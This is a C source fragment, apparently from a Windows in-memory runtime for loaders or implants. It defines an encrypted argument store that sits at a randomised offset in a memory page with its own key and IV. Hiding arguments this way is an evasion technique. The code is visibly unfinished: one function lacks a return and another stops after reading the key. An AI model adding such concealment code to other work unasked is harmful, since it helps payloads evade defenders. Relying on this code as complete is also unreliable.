#include "c_types.h"
#include "windows_t.h"
#include "lib_memory.h"
#include "context.h"
#include "random.h"
#include "crypto.h"
#include "errno.h"
#include "argument.h"
#include "debug.h"

// +----------+----------+----------+----------+----------+
// |    key   |   size   | num args | arg size | arg data |
// +----------+----------+----------+----------+----------+
// | 32 bytes |  uint32  |  uint32  |  uint32  |    var   |
// +----------+----------+----------+----------+----------+

#define ARG_OFFSET_CRYPTO_KEY (0+0)
#define ARG_OFFSET_TOTAL_SIZE (0+32)
#define ARG_OFFSET_NUM_ARGS   (32+4)
#define ARG_OFFSET_FIRST_ARG  (36+4)

typedef struct {
    VirtualFree_t VirtualFree;

    byte* Address;
    uint  Size;

    byte Key[CRYPTO_KEY_SIZE];
    byte IV [CRYPTO_IV_SIZE];
} ArgumentStore;

// methods for runtime
void* AS_Get();
errno AS_Encrypt();
errno AS_Decrypt();
errno AS_Clean();

static bool initStoreAPI(ArgumentStore* store, Context* context);
static bool updateStorePointer(ArgumentStore* store);
static bool initStoreEnvironment(ArgumentStore* store, Context* context);

ArgumentStore_M* InitArgumentStore(Context* context)
{
    // set structure address
    uintptr address = context->MainMemPage;
    uintptr storeAddr  = address + 7000 + RandUintN(address, 128);
    uintptr moduleAddr = address + 7700 + RandUintN(address, 128);
    // initialize tracker
    ArgumentStore* store = (ArgumentStore*)storeAddr;
    mem_clean(store, sizeof(ArgumentStore));
    errno errno = NO_ERROR;
    for (;;)
    {
        if (!initStoreAPI(store, context))
        {
            errno = ERR_RESOURCE_INIT_API;
            break;
        }
        if (!updateStorePointer(store))
        {
            errno = ERR_RESOURCE_UPDATE_PTR;
            break;
        }
        if (!initStoreEnvironment(store, context))
        {
            errno = ERR_RESOURCE_INIT_ENV;
            break;
        }
        break;
    }

}

static errno loadArguments()
{
    uintptr stub = (uintptr)(&Argument_Stub);
    byte*   key  = (byte*)(stub + ARG_OFFSET_CRYPTO_KEY);
    uint32  size = *(uint32*)(stub + ARG_OFFSET_TOTAL_SIZE);




    return NO_ERROR;
}
